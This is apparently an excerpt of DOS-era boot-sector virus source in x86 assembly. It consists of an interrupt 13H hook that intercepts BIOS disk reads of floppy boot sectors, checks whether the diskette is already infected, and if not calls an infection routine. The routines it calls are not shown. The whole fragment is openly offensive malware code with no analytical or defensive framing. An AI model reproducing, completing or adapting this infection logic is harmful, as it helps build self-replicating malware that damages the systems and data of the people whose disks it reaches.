;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                       ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]

;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2.
;If an attempt is made to read the boot sector on the floppy, and
;the motor is off, this routine checks to see if the floppy has
;already been infected, and if not, it goes ahead and infects it.
;
READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     cx,1                            ;is it track 0, sector 1?
        jnz     I13R                            ;no, let BIOS handle it
        cmp     dl,80H                          ;no, is it hard drive c:?
        jz      I13R                            ;yes, let BIOS handle it
        mov     cs:[CURR_DISK],dl               ;save currently accessed drive #
        call    CHECK_DISK                      ;is floppy already infected?
        jz      I13R                            ;yes, pass control to BIOS
        call    INIT_FAT_MANAGER                ;initialize FAT management routines
        call    INFECT_FLOPPY                   ;no, go infect the diskette
        jmp     I13R

